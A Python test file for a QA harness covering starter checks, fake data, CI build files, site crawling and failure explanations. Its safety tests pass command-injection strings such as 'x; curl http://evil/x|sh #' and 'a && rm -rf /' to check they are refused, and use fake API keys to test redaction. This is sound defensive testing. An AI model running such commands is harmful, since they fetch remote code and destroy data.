"""Ready-made checks, made-up data, build files, and asking about a failure."""

from __future__ import annotations

import copy
import json
import tempfile
import unittest
from pathlib import Path

from our_harness import handover, qa, starters
from our_harness.config import DEFAULT_CONFIG, LoadedConfig
from our_harness.models import HarnessError


class StarterTests(unittest.TestCase):
    def test_every_ready_made_check_is_a_check_the_harness_understands(self) -> None:
        for item in starters.STARTERS:
            with self.subTest(starter=item.key):
                suite = qa.parse_suite({"schema_version": 1, "name": "d", "cases": [dict(item.case)]})
                self.assertEqual(suite.cases[0].id, item.case["id"])
                # It must survive being written out and read back, like any check.
                again = qa.parse_suite(json.loads(json.dumps(suite.to_dict())))
                self.assertEqual(again.to_dict(), suite.to_dict())

    def test_every_ready_made_check_explains_itself(self) -> None:
        for item in starters.STARTERS:
            with self.subTest(starter=item.key):
                self.assertTrue(item.title.strip())
                self.assertTrue(item.what_it_does.strip())
                self.assertTrue(item.change_this.strip())
                self.assertTrue(item.needs.strip())
                self.assertNotIn("_", item.key.replace("-", ""))

    def test_the_address_can_be_changed(self) -> None:
        case = starters.build("page-opens", url="http://127.0.0.1:9000/")
        self.assertEqual(case["url"], "http://127.0.0.1:9000/")

    def test_a_plain_address_keeps_the_example_path(self) -> None:
        # Somebody says "my site is here"; the check still asks the right page.
        case = starters.build("answer-keeps-its-shape", url="http://127.0.0.1:9000/")
        self.assertEqual(case["url"], "http://127.0.0.1:9000/api/health")

    def test_an_address_with_its_own_path_wins(self) -> None:
        case = starters.build("answer-keeps-its-shape", url="http://127.0.0.1:9000/orders")
        self.assertEqual(case["url"], "http://127.0.0.1:9000/orders")

    def test_the_check_can_be_given_a_name(self) -> None:
        case = starters.build("page-opens", case_id="my-home-page")
        self.assertEqual(case["id"], "my-home-page")

    def test_rubbish_is_refused_with_a_sentence(self) -> None:
        for call in (
            lambda: starters.build("nothing-like-this"),
            lambda: starters.build("page-opens", url="not-an-address"),
            lambda: starters.build("page-opens", case_id="Not A Name"),
        ):
            with self.subTest(), self.assertRaises(HarnessError):
                call()

    def test_the_screen_sizes_are_real_numbers(self) -> None:
        for name in starters.SCREENS:
            width, height = starters.screen(name)
            self.assertGreater(width, 100)
            self.assertGreater(height, 100)
        with self.assertRaises(HarnessError):
            starters.screen("enormous")


class MadeUpDataTests(unittest.TestCase):
    def test_the_same_seed_gives_the_same_table(self) -> None:
        first = starters.made_up_rows(5, ["name", "email"], seed=7)
        again = starters.made_up_rows(5, ["name", "email"], seed=7)
        self.assertEqual(first, again)
        other = starters.made_up_rows(5, ["name", "email"], seed=8)
        self.assertNotEqual(first, other)

    def test_known_columns_get_sensible_values(self) -> None:
        row = starters.made_up_rows(1, ["name", "email", "phone", "date", "number"])[0]
        self.assertIn(" ", row["name"])
        self.assertIn("@", row["email"])
        self.assertTrue(row["phone"].startswith("+1-555-"))
        self.assertRegex(row["date"], r"^\d{4}-\d{2}-\d{2}$")
        self.assertTrue(row["number"].isdigit())

    def test_an_unknown_column_still_gets_something(self) -> None:
        row = starters.made_up_rows(1, ["favourite colour"])[0]
        self.assertTrue(row["favourite colour"])

    def test_a_made_up_password_is_never_mistaken_for_a_real_one(self) -> None:
        from our_harness import scan

        rows = starters.made_up_rows(20, ["password", "secret"])
        for row in rows:
            for value in row.values():
                with self.subTest(value=value):
                    self.assertEqual(scan.scan_text(f'password = "{value}"', "a.py"), [])

    def test_the_table_can_be_used_as_rows_in_a_check(self) -> None:
        rows = starters.made_up_rows(3, ["name", "email"])
        suite = qa.parse_suite({"name": "d", "cases": [{
            "id": "many", "kind": "http", "url": "http://127.0.0.1:9/${row.name}", "rows": rows,
        }]})
        with tempfile.TemporaryDirectory() as temporary:
            config = LoadedConfig(copy.deepcopy(DEFAULT_CONFIG), Path(temporary).resolve(), [], {})
            expanded = qa.QaRunner(config).expand(suite.cases[0])
        self.assertEqual(len(expanded), 3)
        self.assertNotIn("${row.name}", expanded[0].url)

    def test_silly_asks_are_refused(self) -> None:
        for call in (
            lambda: starters.made_up_rows(0, ["name"]),
            lambda: starters.made_up_rows(5, []),
            lambda: starters.made_up_rows(10_000, ["name"]),
            lambda: starters.made_up_rows(5, ["name"], seed="one"),
        ):
            with self.subTest(), self.assertRaises(HarnessError):
                call()  # type: ignore[arg-type]


class BuildFileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        (self.root / ".harness").mkdir()
        self.config = LoadedConfig(copy.deepcopy(DEFAULT_CONFIG), self.root, [], {})
        self.addCleanup(self.temporary.cleanup)

    def test_a_build_file_is_written_for_each_service(self) -> None:
        for service in handover.SERVICES:
            with self.subTest(service=service):
                relative = handover.write_build_file(self.config, service, replace=True)
                body = (self.root / relative).read_text(encoding="utf-8")
                self.assertIn("harness qa run", body)
                self.assertIn("junit", body)

    def test_an_existing_file_is_not_written_over_by_accident(self) -> None:
        relative = handover.write_build_file(self.config, "github")
        (self.root / relative).write_text("mine, do not touch\n", encoding="utf-8")
        with self.assertRaises(HarnessError) as caught:
            handover.write_build_file(self.config, "github")
        self.assertIn("already there", str(caught.exception))
        self.assertEqual((self.root / relative).read_text(encoding="utf-8"), "mine, do not touch\n")

    def test_a_service_it_does_not_know_is_refused(self) -> None:
        with self.assertRaises(HarnessError) as caught:
            handover.build_file("some-other-service")
        self.assertIn("github", str(caught.exception))

    def test_the_suite_and_python_version_reach_the_file(self) -> None:
        _path, body = handover.build_file("github", suite=".harness/qa/nightly.json", python="3.12")
        self.assertIn("--suite .harness/qa/nightly.json", body)
        self.assertIn("3.12", body)

    def test_a_silly_python_version_is_refused(self) -> None:
        with self.assertRaises(HarnessError):
            handover.build_file("github", python="latest; rm -rf /")


class ExplainTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        (self.root / ".harness").mkdir()
        self.config = LoadedConfig(copy.deepcopy(DEFAULT_CONFIG), self.root, [], {})
        self.addCleanup(self.temporary.cleanup)

    def report(self) -> dict:
        return {
            "run_id": "r1",
            "cases": [
                {"id": "fine", "title": "This one is fine", "kind": "command", "status": "passed"},
                {
                    "id": "broken", "title": "The login page opens", "kind": "browser",
                    "status": "failed", "reasons": ["Step 2 did not work: click #go"],
                    "attempts": [{"number": 1, "passed": False, "evidence": "the button was not there"}],
                },
            ],
        }

    def test_the_failed_check_is_the_one_picked(self) -> None:
        case, evidence = handover.failure_from_run(self.report())
        self.assertEqual(case["id"], "broken")
        self.assertIn("not there", evidence)

    def test_a_run_with_nothing_wrong_says_so(self) -> None:
        with self.assertRaises(HarnessError) as caught:
            handover.failure_from_run({"cases": [{"id": "fine", "status": "passed"}]})
        self.assertIn("nothing to explain", str(caught.exception))

    def test_asking_about_a_check_that_passed_names_the_ones_that_failed(self) -> None:
        with self.assertRaises(HarnessError) as caught:
            handover.failure_from_run(self.report(), "fine")
        self.assertIn("broken", str(caught.exception))

    def test_the_question_holds_what_the_check_saw_and_asks_for_plain_words(self) -> None:
        case, evidence = handover.failure_from_run(self.report())
        question = handover.failure_question(case, evidence)
        self.assertIn("The login page opens", question)
        self.assertIn("Step 2 did not work", question)
        self.assertIn("the button was not there", question)
        self.assertIn("plain English", question)
        self.assertIn("Only use what is written above", question)

    def test_a_huge_piece_of_evidence_is_shortened(self) -> None:
        question = handover.failure_question({"id": "a", "kind": "command"}, "x" * 10_000)
        self.assertLess(len(question), 4000)
        self.assertIn("shortened", question)

    def test_asking_with_no_model_set_up_says_what_to_do(self) -> None:
        data = copy.deepcopy(DEFAULT_CONFIG)
        data["provider"].update({"name": "openai", "endpoint": "https://127.0.0.1:1", "api_key_env": "NOT_SET_ANYWHERE"})
        config = LoadedConfig(data, self.root, [], {})
        case, evidence = handover.failure_from_run(self.report())
        with self.assertRaises(HarnessError) as caught:
            handover.explain_failure(config, case, evidence)
        self.assertIn("harness doctor", str(caught.exception))

    def test_reading_a_run_that_is_not_there_says_so(self) -> None:
        with self.assertRaises(HarnessError) as caught:
            handover.read_run(self.config)
        self.assertIn("Run the checks first", str(caught.exception))

    def test_the_most_recent_run_is_the_one_read(self) -> None:
        base = self.root / ".harness" / "qa" / "runs"
        for name, run_id in (("20260101-000001", "old"), ("20260101-000002", "new")):
            folder = base / name
            folder.mkdir(parents=True)
            (folder / "result.json").write_text(json.dumps({"run_id": run_id, "cases": []}), encoding="utf-8")
        self.assertEqual(handover.read_run(self.config)["run_id"], "new")


class CrawlTests(unittest.TestCase):
    """Walking a site from one page."""

    def case(self, expect: dict | None = None) -> qa.QaCase:
        body = {"id": "walk", "kind": "crawl", "url": "http://127.0.0.1:8765/", "max_pages": 5}
        if expect is not None:
            body["expect"] = expect
        return qa.parse_suite({"name": "d", "cases": [body]}).cases[0]

    def test_nothing_opened_is_a_failure(self) -> None:
        found = qa.crawl_reasons(self.case(), {"pages": []})
        self.assertIn("nothing was checked", found[0])

    def test_a_broken_page_is_named(self) -> None:
        report = {"pages": [
            {"url": "http://127.0.0.1:8765/", "status": 200},
            {"url": "http://127.0.0.1:8765/gone", "status": 404},
        ]}
        found = qa.crawl_reasons(self.case(), report)
        self.assertIn("/gone", found[0])
        self.assertIn("404", found[0])

    def test_a_page_that_never_answered_counts_as_broken(self) -> None:
        report = {"pages": [{"url": "http://127.0.0.1:8765/slow", "status": 0, "problem": "timed out"}]}
        found = qa.crawl_reasons(self.case(), report)
        self.assertIn("timed out", found[0])

    def test_finding_too_few_pages_is_reported_with_the_right_words(self) -> None:
        report = {"pages": [{"url": "http://127.0.0.1:8765/", "status": 200}]}
        found = qa.crawl_reasons(self.case({"min_pages": 5}), report)
        self.assertIn("Only 1 page was found", found[0])

    def test_a_healthy_walk_has_nothing_to_say(self) -> None:
        report = {"pages": [
            {"url": "http://127.0.0.1:8765/", "status": 200},
            {"url": "http://127.0.0.1:8765/next", "status": 200},
        ]}
        self.assertEqual(qa.crawl_reasons(self.case({"min_pages": 2}), report), ())

    def test_the_summary_counts_what_was_opened(self) -> None:
        line = qa.crawl_summary({"pages": [{"url": "a", "status": 200}, {"url": "b", "status": 500}], "morePages": 3})
        self.assertIn("Opened 2 pages", line)
        self.assertIn("1 did not answer", line)
        self.assertIn("3 more", line)

    def test_a_crawl_only_follows_links_under_its_own_address(self) -> None:
        script = qa.browser_script({
            "url": "http://127.0.0.1:1/", "routes": [], "steps": [],
            "crawl": {"maxPages": 5, "stayUnder": "http://127.0.0.1:1/"},
        })
        self.assertIn("stayUnder", script)
        self.assertIn("if (!inside(plain)) continue;", script)


if __name__ == "__main__":
    unittest.main()


class SafetyOfTheNewToolsTests(unittest.TestCase):
    """The new tools must not become new ways to reach further."""

    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        (self.root / ".harness").mkdir()
        self.config = LoadedConfig(copy.deepcopy(DEFAULT_CONFIG), self.root, [], {})
        self.addCleanup(self.temporary.cleanup)

    def test_a_walk_may_not_wander_onto_a_host_the_project_never_allowed(self) -> None:
        # One field in a suite file must not be able to point a real browser at
        # any address on the network.
        suite = qa.parse_suite({"name": "d", "cases": [{
            "id": "walk", "kind": "crawl", "url": "http://127.0.0.1:9910/",
            "stay_under": "http://10.0.0.5:9911/",
        }]})
        runner = qa.QaRunner(self.config)
        runner.browser_available = lambda: True  # type: ignore[method-assign]
        case = runner.run(suite, run_id="c1", write_artifacts=False).cases[0]
        self.assertEqual(case.status, "failed")
        self.assertIn("may not call 10.0.0.5", case.reasons[0])

    def test_the_page_is_told_which_hosts_it_may_open(self) -> None:
        script = qa.browser_script({
            "url": "http://127.0.0.1:1/", "routes": [], "steps": [],
            "crawl": {"maxPages": 3, "stayUnder": "http://127.0.0.1:1/", "allowedHosts": ["127.0.0.1"]},
        })
        self.assertIn("allowedHosts", script)
        self.assertIn("allowedHost(plain)", script)

    def test_nothing_a_check_saw_reaches_a_model_with_a_key_still_in_it(self) -> None:
        question = handover.failure_question(
            {"id": "a", "title": "A check", "kind": "command", "reasons": ["boom"]},
            'stdout: api_key="sk-live-abcdefghijklmnop" and password = "hunter2hunter2"',
        )
        self.assertNotIn("sk-live-abcdefghijklmnop", question)
        self.assertNotIn("hunter2hunter2", question)
        self.assertIn("boom", question)

    def test_a_build_file_cannot_be_made_to_run_something_else(self) -> None:
        for suite in (
            "x; curl http://evil/x|sh #",
            "$(whoami)",
            "a && rm -rf /",
            "../outside/suite.json",
            "a b.json",
        ):
            with self.subTest(suite=suite), self.assertRaises(HarnessError):
                handover.build_file("github", suite=suite)

    def test_a_plain_suite_path_is_still_allowed(self) -> None:
        _path, body = handover.build_file("github", suite=".harness/qa/nightly.json")
        self.assertIn("--suite .harness/qa/nightly.json", body)


class NewToolFixTests(unittest.TestCase):
    """The five the hunter proved in the newest tools."""

    def test_asking_for_the_same_column_twice_is_refused(self) -> None:
        with self.assertRaises(HarnessError) as caught:
            starters.made_up_rows(2, ["email", "email"])
        self.assertIn("more than once", str(caught.exception))
        # One of each is still fine.
        rows = starters.made_up_rows(2, ["email", "name"])
        self.assertEqual(sorted(rows[0]), ["email", "name"])

    def test_a_walk_stays_inside_a_folder_not_a_piece_of_text(self) -> None:
        # /blog must not take in /blog-secret, which is a different part of a
        # site that merely starts with the same letters.
        script = qa.browser_script({
            "url": "http://127.0.0.1:1/blog/", "routes": [], "steps": [],
            "crawl": {"maxPages": 3, "stayUnder": "http://127.0.0.1:1/blog", "allowedHosts": ["127.0.0.1"]},
        })
        self.assertIn("address.startsWith(boundary)", script)
        self.assertIn("stayUnder + '/'", script)

    def test_a_walk_that_starts_at_a_page_stays_in_its_folder(self) -> None:
        self.assertEqual(qa._folder_of("http://127.0.0.1:8/blog/index.html"), "http://127.0.0.1:8/blog/")
        self.assertEqual(qa._folder_of("http://127.0.0.1:8/blog/"), "http://127.0.0.1:8/blog/")
        self.assertEqual(qa._folder_of("http://127.0.0.1:8"), "http://127.0.0.1:8/")

    def test_each_try_keeps_its_own_pictures(self) -> None:
        script = qa.browser_script({
            "url": "http://127.0.0.1:1/", "routes": ["/"], "steps": [{"do": "click", "target": "#a"}],
            "pictures": "failure", "picturesFolder": ".harness/qa/runs/x/a", "attempt": 2,
        })
        # Without the attempt in the name, a second try paints over what the
        # first one saw, and the report still claims two pictures.
        self.assertIn("'attempt-' + String(plan.attempt || 1)", script)

    def test_a_recorded_password_stays_hidden_even_when_the_page_reveals_it(self) -> None:
        from our_harness import recorder

        script = recorder.recorder_script({"url": "http://127.0.0.1:1/"})
        # A "show password" button turns the box into an ordinary one, so what
        # kind it is right now cannot be the only question asked.
        self.assertIn("wasSecret", script)
        self.assertIn("looksSecret", script)
        self.assertIn("passphrase", script)
        self.assertIn("current-password", script)

    def test_the_recording_bar_keeps_out_of_the_way(self) -> None:
        from our_harness import recorder

        script = recorder.recorder_script({"url": "http://127.0.0.1:1/"})
        # A bar across the top covers the buttons somebody came to record.
        self.assertIn("bottom:16px", script)
        self.assertNotIn("top:12px", script)
